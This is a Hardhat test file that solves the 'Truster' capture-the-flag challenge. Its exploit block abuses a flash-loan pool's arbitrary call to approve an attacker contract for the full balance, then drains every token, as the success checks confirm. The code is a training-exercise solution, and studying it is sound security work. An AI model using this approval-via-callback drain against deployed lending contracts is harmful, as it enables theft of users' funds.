const { ethers } = require('hardhat');
const { expect } = require('chai');
const { AbiCoder } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        const AttackTruster = await ethers.getContractFactory('AttackTruster', deployer)
        this.attack = await AttackTruster.deploy(this.token.address, this.pool.address)

        let ABI = [
            "function approve(uint _amount)"
        ];

        let iface = new ethers.utils.Interface(ABI);
        
        this.pool.connect(attacker).flashLoan(
            0, attacker, this.attack.address, 
            iface.encodeFunctionData("approve", [ TOKENS_IN_POOL ])
            )

        this.attack.connect(attacker).drain(TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

